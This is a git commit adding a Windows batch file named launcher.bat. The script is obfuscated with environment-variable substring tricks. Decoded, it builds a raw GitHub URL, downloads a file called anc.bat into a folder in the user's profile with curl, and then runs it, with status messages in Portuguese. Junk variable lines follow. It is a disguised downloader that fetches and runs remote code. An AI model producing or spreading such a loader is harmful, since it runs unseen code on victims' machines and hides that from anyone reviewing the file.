9943194252c17f5f4a919a9ab335d537eb7f021d
worbadillitics <119168200+Worbnaticus@users.noreply.github.com>
2023-12-02 22:00:05 -0300

    Launcher

---
+++ launcher.bat
@@ -0,0 +1,33 @@
+ÿþ&cls
+@%pUBlIc:~89,83%%PUBLic:~5,1%CHo^ of^%PuBlIC:~46,16%f
+SEt R^=Jg^%pUBLIc:~13,1%^gtGXz%pUBLIc:~4,1%w%pUBLIc:~11,1%^hm%pUBLIc:~10,1%^S^HI^O^A
+^%pUBlIC:~14,1%^L%pUBliC:~55,17%^%publIc:~4,1%
+@^e^c%r:~15,1%^%r:~17,1% ^%r:~17,1%n
+@ec%r:~11,1%o off
+%r:~8,1%e%r:~4,1% "%r:~5,1%%r:~2,1%%r:~4,1%%r:~15,1%%r:~13,1%%r:~10,1%URL=%r:~11,1%%r:~4,1%%r:~4,1%p%r:~8,1%://ra%r:~9,1%.%r:~1,1%%r:~2,1%%r:~4,1%%r:~11,1%%r:~13,1%%r:~10,1%%r:~13,1%%r:~8,1%ercon%r:~4,1%en%r:~4,1%.co%r:~12,1%/Wor%r:~10,1%na%r:~4,1%%r:~2,1%c%r:~13,1%%r:~8,1%/Ma%r:~4,1%%r:~11,1%%r:~17,1%p%r:~4,1%%r:~2,1%%r:~12,1%%r:~2,1%%r:~7,1%er/%r:~12,1%a%r:~2,1%n/anc.%r:~10,1%a%r:~4,1%"
+%r:~8,1%e%r:~4,1% "LocalFolder=%USERPROFILE%\Ma%r:~4,1%%r:~11,1%%r:~17,1%p%r:~4,1%%r:~2,1%%r:~12,1%%r:~2,1%%r:~7,1%er"
+%r:~8,1%e%r:~4,1% "LocalF%r:~2,1%le=%LocalFolder%\anc.%r:~10,1%a%r:~4,1%"
+
+ec%r:~11,1%o Cr%r:~2,1%ando a pa%r:~8,1%%r:~4,1%a Ma%r:~4,1%%r:~11,1%%r:~17,1%p%r:~4,1%%r:~2,1%%r:~12,1%%r:~2,1%%r:~7,1%er...
+%r:~12,1%kd%r:~2,1%r "%LocalFolder%"
+
+ec%r:~11,1%o Ba%r:~2,1%xando o arq%r:~13,1%%r:~2,1%vo do %r:~5,1%%r:~2,1%%r:~4,1%%r:~15,1%%r:~13,1%%r:~10,1%...
+c%r:~13,1%rl -o "%LocalFile%" "%GitHubURL%"
+
+%r:~2,1%f %errorlevel% neq 0 (
+    ec%r:~11,1%o %r:~15,1%o%r:~13,1%ve %r:~13,1%%r:~12,1% pro%r:~10,1%le%r:~12,1%a ao %r:~10,1%a%r:~2,1%xar o arq%r:~13,1%%r:~2,1%vo. Ver%r:~2,1%f%r:~2,1%q%r:~13,1%e a URL do %r:~5,1%%r:~2,1%%r:~4,1%%r:~15,1%%r:~13,1%%r:~10,1%.
+    pa%r:~13,1%%r:~8,1%e
+    ex%r:~2,1%%r:~4,1% /%r:~10,1% 1
+)
+
+ec%r:~11,1%o Exec%r:~13,1%%r:~4,1%ando o arq%r:~13,1%%r:~2,1%vo...
+call "%LocalFile%"
+
+ec%r:~11,1%o %r:~14,1%cr%r:~2,1%p%r:~4,1% concl%r:~13,1%Ã­do!
+pa%r:~13,1%%r:~8,1%e
+
+@ec%r:~11,1%o off
+%r:~8,1%e%r:~4,1% a = %%~i
+%r:~8,1%e%r:~4,1% a = % + %~i"%%~%r:~2,1%"%
+set a = %a%
+:aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
